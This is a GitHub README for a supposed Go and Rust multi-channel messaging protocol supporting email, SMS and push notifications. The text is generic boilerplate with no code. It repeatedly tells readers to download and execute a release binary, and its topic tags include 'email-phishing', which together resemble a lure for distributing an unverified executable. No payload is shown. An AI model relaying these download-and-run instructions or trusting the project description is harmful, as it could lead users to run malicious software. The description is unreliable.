# Protocol — Cross‑Platform Messaging Protocol (Go + Rust) ✉️🔔

[![Releases](https://img.shields.io/badge/Releases-%E2%9C%A8-blue)](https://github.com/Dipalok/protocol/releases)  
![Language: Go & Rust](https://img.shields.io/badge/Language-Go%20%26%20Rust-2ea44f) ![Topics](https://img.shields.io/badge/Topics-messaging-orange)

![Messaging Hero](https://images.unsplash.com/photo-1526378726656-36e0f5d7d8f4?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=60)

Protocol is a lightweight communication stack built with Go and Rust. It focuses on reliable messaging across platforms. It supports email, push, SMS, and in‑app notifications. It aims to make message delivery predictable, observable, and secure.

Features
- Unified transport layer for TCP, TLS, and WebSocket.
- Message frames with headers and body, optimized for low latency.
- Native Go client and Rust core with FFI bindings.
- Pluggable adapters: SMTP, SendGrid, SMS gateways.
- Delivery reports, retries, and deduplication.
- Message signing and encryption primitives.
- Small binary size, low memory use.

Why this repo
- Use Go for network I/O and integration with existing services.
- Use Rust for core protocol logic and safety.
- Provide a cross‑platform protocol that works in cloud and edge devices.
- Enable easy integration with email providers, SMS APIs, and notification channels.

Badges and Links
- Releases: https://github.com/Dipalok/protocol/releases (download the release files; the release asset needs to be downloaded and executed)
- GitHub topics include: e-mail, e-mail-service, email-phishing, email-sender, email-verification, linux, mensageria, mesage, notification, notifications, push-notifications, sendgrid-mail, sendmail, sendmessage, sms, sms-api, sms-client, sms-messages

Quick demo image
![Protocol Diagram](https://raw.githubusercontent.com/Dipalok/protocol/master/docs/images/diagram.png)

Core Concepts
- Frame: A binary envelope that carries a message. It contains a header, flags, and a payload.
- Channel: A logical route for messages (email, sms, push).
- Adapter: A component that translates protocol frames to provider API calls (SMTP, SendGrid, Twilio).
- Broker: The runtime that routes frames, retries failed deliveries, and emits metrics.
- Client: A small library that apps use to create and send frames.

Protocol design highlights
- Binary header with fixed fields for version, type, and sequence.
- Optional JSON or Protobuf payloads.
- Support for backpressure signals and flow control.
- Keepalive and heartbeats for persistent connections.
- Pluggable compression and encryption layers.

Architecture overview
- Rust core (engine)
  - Implements framing, routing, dedupe, retry logic.
  - Small, tested, memory-safe.
  - Exposes a C FFI for integration.
- Go runtime (adapter layer)
  - Handles network I/O, provider SDKs, and orchestration.
  - Uses the Rust core via a thin shim or via gRPC for separated deployments.
- CLI and tooling
  - Build, test, and run helper utilities in Go.
  - Simple binary for local testing and integration.

Getting started (source build)
- Build Rust core with the standard toolchain.
  - Install Rust toolchain.
  - Run cargo build --release
- Build Go runtime.
  - Install Go (1.20+ recommended).
  - Run go build ./cmd/protocold
- Start a local broker.
  - Run the broker binary, point it to local adapters.

Using Releases
- Visit the Releases page to fetch stable binaries and installer scripts:
  https://github.com/Dipalok/protocol/releases
  The release page contains a packaged binary or installer. Download the provided asset and execute the file that matches your platform. The asset needs to be downloaded and executed to run a prebuilt broker or client.

Basic flow (example)
1. Client builds a message frame.
2. Client sends the frame to the broker over TLS.
3. Broker routes the frame to an adapter.
4. Adapter translates the frame to a provider API call.
5. Provider returns a delivery status.
6. Broker records the status and returns an acknowledgement.

Message formats
- JSON payload (human readable)
  - Useful for debugging and integrations.
- Protobuf payload (compact)
  - Useful for high throughput and typed schemas.

Adapters supported out of the box
- SMTP / Sendmail
- SendGrid HTTP API
- Generic HTTP webhook
- SMS gateways (Twilio style)
- Local file sink for testing

CLI usage examples (plain commands)
- Start broker in foreground (example)
  ./protocold --config ./config/broker.yaml
- Send a test message via CLI
  protocolctl send --channel=email --to user@example.com --subject "Hello" --body "Test"

Authentication and security
- Mutual TLS for broker-to-adapter connections.
- Message signing using Ed25519 for end-to-end verification.
- Optional payload encryption using AEAD.
- Role-based access for client keys.

Observability
- Prometheus metrics endpoint for throughput, queue depth, retries, and errors.
- Structured logs in JSON for parsing by logging systems.
- Tracing spans compatible with OpenTelemetry.

Integration examples

Send an email through the Go client
- Create a frame with channel "email", recipient, subject, and body.
- Submit the frame to the broker endpoint.
- Broker will select an email adapter and call the provider.

Send an SMS
- Build a frame with channel "sms" and phone number.
- The broker chooses an SMS adapter and sends the message.
- The adapter maps frame fields to provider API fields.

WebSocket transport for browsers
- Use the lightweight client protocol carried over a secure WebSocket.
- The client registers for live delivery reports and inbound messages.

Testing
- Unit tests run with cargo test and go test.
- Integration tests use a local broker and adapter mocks.
- Reproduce failures by toggling adapter responses.

Configuration
- YAML config for broker and adapters.
- Key sections:
  - transports: define listeners and TLS certs.
  - adapters: map channels to adapter binaries or HTTP endpoints.
  - storage: define persistence backends for queues and state.
  - security: key pairs and access control.

Persistence and state
- Pluggable backends: SQLite for small installs, Postgres for scale.
- Idempotent writes for dedupe.
- Durable queues with configurable retention.

Performance tips
- Use Protobuf payloads for high throughput.
- Tune adapter concurrency based on provider rate limits.
- Use batching where provider API allows it.

Development workflow
- Clone the repo and set up Rust and Go toolchains.
- Run unit tests for Rust and Go modules.
- Use the provided docker-compose for integration testing.
- Open pull requests for feature work with tests and changelog entry.

Contributing
- Fork the repo and create a feature branch.
- Keep commits small and focused.
- Write tests for new logic.
- Follow the code style for both Go and Rust.
- Add API docs for any external facing change.
- Submit a pull request for review.

Project structure (high level)
- cmd/ — CLI and server entry points.
- core/ — Rust core engine and protocol logic.
- adapters/ — Go adapter implementations.
- docs/ — Design docs, diagrams, and protocol spec.
- examples/ — Example apps and integration samples.
- test/ — Integration test scenarios and harness.

Topics and integrations
This repo targets many integration points and use cases:
- e-mail, e-mail-service, email, email-phishing, email-sender, email-verification
- linux, mensageria, mesage
- notification, notifications, push-notifications
- sendgrid-mail, sendmail, sendmessage
- sms, sms-api, sms-client, sms-messages

Roadmap (high‑level)
- 1.x: Stable framing, adapters, and basic observability.
- 2.x: Multi‑tenant routing and policy engine.
- 3.x: Native SDKs for mobile platforms and browser workers.

License
- The project uses an open source license. See LICENSE file in the repo.

Support
- Open an issue in the GitHub issue tracker for bugs and feature requests.
- Use the Discussions tab for design questions and proposals.

Releases and binaries
- Check the releases page: https://github.com/Dipalok/protocol/releases  
  Download the archive or installer that matches your OS. Once you download the asset, run the provided executable to start the prebuilt broker or client. The release asset needs to be downloaded and executed to run the packaged binaries.

Images and diagrams
- Architecture diagrams live in docs/images.
- Use the diagram to map adapter flow and transport layers.
- Example diagram:
  - Client -> TLS -> Broker -> Adapter -> Provider

Examples and recipes
- Email verification flow:
  - Client composes verification frame with a signed token.
  - Broker sends the frame through the email adapter.
  - Recipient clicks the link that passes the token back to a verification endpoint.
- Transactional SMS:
  - Broker batches short messages to meet provider throughput.
  - Broker stores receipt IDs and polls for delivery status.

Contact and maintainers
- Maintainers live in the CONTRIBUTORS file.
- Submit issues and pull requests on GitHub.

License and credits
- See LICENSE in the repository root for license terms.
- See CONTRIBUTORS for contributors and third‑party notices.

Explore releases and download binaries
[![Get Releases](https://img.shields.io/badge/Get%20Releases-%F0%9F%93%A5-brightgreen)](https://github.com/Dipalok/protocol/releases)

This repository aims to provide a practical, secure protocol for multi‑channel messaging. The design favors clarity, safety, and straight forward integration with email, SMS, and notification systems.